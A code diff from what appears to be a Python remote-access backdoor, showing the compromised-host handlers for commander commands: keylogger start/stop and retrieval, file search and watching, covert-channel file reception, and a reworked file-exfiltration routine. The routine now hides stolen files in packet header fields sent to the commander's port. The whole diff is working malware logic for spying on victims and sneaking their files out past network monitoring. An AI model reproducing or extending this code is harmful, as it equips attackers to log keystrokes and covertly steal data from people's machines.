@@ -24,7 +24,7 @@ if __name__ == '__main__':
                     print(constants.CLIENT_DISCONNECT_MSG.format(client_address[0], client_address[1]))
                     break
 
-                # a) Command to start/stop keylogger program
+# a) Command to start/stop keylogger program
                 if data.decode() == constants.START_KEYLOG_MSG:
                     print(constants.START_KEYLOGGER_PROMPT)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
@@ -88,7 +88,7 @@ if __name__ == '__main__':
                             status = client_socket.send(constants.STATUS_FALSE.encode())
                             msg = client_socket.send(constants.FILE_NOT_FOUND_TO_CMDR_ERROR.format(file_name).encode())
 
-                # b) Command to GET keylog program from commander
+# b) Command to GET keylog program from commander
                 if data.decode() == constants.GET_KEYLOGGER_MSG:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))
 
@@ -181,7 +181,7 @@ if __name__ == '__main__':
                         print(constants.SEARCH_FILES_ERROR_MSG)
                         client_socket.send(constants.SEARCH_FILES_ERROR_SEND.encode())
 
-                # d) WATCH FILE
+# d) WATCH FILE
                 if data.decode() == constants.WATCH_FILE_SIGNAL:
                     print("[+] Client says: {}".format(constants.WATCH_FILE_SIGNAL))
 
@@ -216,7 +216,7 @@ if __name__ == '__main__':
                         client_socket.send((constants.STATUS_FALSE + "/" +
                                             constants.WATCH_FILE_NOT_EXIST_TO_CMDR.format(file_path)).encode())
 
-                # e) Receive File from Commander (Covert Channel)
+# e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
                     # Initialize Variables
                     received_packets = []
@@ -243,17 +243,15 @@ if __name__ == '__main__':
                     print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))
 
                     # Get function handler from a map (according to header/field)
-                    header_field_function_map = get_protocol_header_function_map()
+                    header_field_function_map = get_protocol_header_function_extract_map()
                     if choices in header_field_function_map:
                         selected_function = header_field_function_map.get(choices)
-
 
                     # A callback function for handling of received packets
                     def packet_callback(packet):
                         global filename
                         binary_data = selected_function(packet)
                         return binary_data
-
 
                     # DIFFERENT SNIFFS: For IPv4 Headers/Field
                     if constants.IPV4 in choices:
@@ -345,44 +343,30 @@ if __name__ == '__main__':
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
-                # f) Transfer file to Commander
+# f) Transfer file to Commander
                 if data.decode() == constants.GET_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.GET_FILE_SIGNAL))
 
                     # Send ACK
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
-                    # Receive File Path
-                    file_path = client_socket.recv(1024).decode()
-                    print(constants.GET_FILE_CMDR_PATH.format(file_path))
-                    print(constants.GET_FILE_INIT_TRANSFER)
+                    # Wait Response: Receive File Path + Covert Channel Config (Header + Field)
+                    file_path, header, field, cmdr_port = client_socket.recv(1024).decode().split("/")
+
+                    # CHECK: If destination field choice, do nothing
+                    if constants.DESTINATION_ADDRESS_FIELD == field:
+                        print(constants.FILE_TRANSFER_UNSUCCESSFUL)
+                        continue
 
                     # If exists, then initiate file transfer
                     if os.path.exists(file_path):
+                        print(constants.GET_FILE_CMDR_PATH.format(file_path))
+                        print(constants.GET_FILE_FOUND_MSG.format(file_path))
+                        print(constants.GET_FILE_INIT_MSG.format(file_path))
+
                         client_socket.send(constants.GET_FILE_EXIST.encode())
-
-                        # Wait for client/victim to buffer
-                        time.sleep(1)
-
-                        with open(file_path, 'rb') as file:
-                            while True:
-                                data = file.read(1024)
-                                if not data:
-                                    break
-                                client_socket.send(data)
-
-                        # Send EOF signal to prevent receiver's recv() from blocking
-                        client_socket.send(constants.FILE_END_OF_FILE_SIGNAL)
-
-                        # Get an ACK from victim for success
-                        transfer_result = client_socket.recv(1024).decode()
-
-                        if transfer_result == constants.VICTIM_ACK:
-                            print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
-                                                                            client_address[0],
-                                                                            client_address[1]))
-                        else:
-                            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+                        transfer_file_covert(client_socket, client_address[0], int(cmdr_port),
+                                             source_port, (header, field), file_path)
                     else:
                         client_socket.send(constants.GET_FILE_NOT_EXIST.encode())
                         print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
